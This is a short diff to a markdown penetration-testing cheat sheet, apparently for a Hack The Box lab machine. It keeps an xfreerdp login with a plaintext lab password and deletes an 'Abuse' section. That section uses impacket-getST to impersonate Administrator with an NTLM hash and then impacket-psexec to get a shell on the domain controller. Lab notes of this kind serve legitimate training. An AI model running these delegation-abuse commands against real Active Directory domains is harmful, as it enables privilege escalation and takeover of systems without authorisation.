@@ -25,9 +25,3 @@ Using netexec:
 
 ### <ins>RDP to host using xfreerdp</ins>:
 - `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' +dynamic-resolution +clipboard`
-
-Abuse:
-
-    1. impacket-getST.py -spn cifs/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes :67065141d298d67a17ee8626476b20f9
-    2. export KRB5CCNAME=Administrator.ccache
-    3. impacket-psexec -k -no-pass dc.intelligence.htb
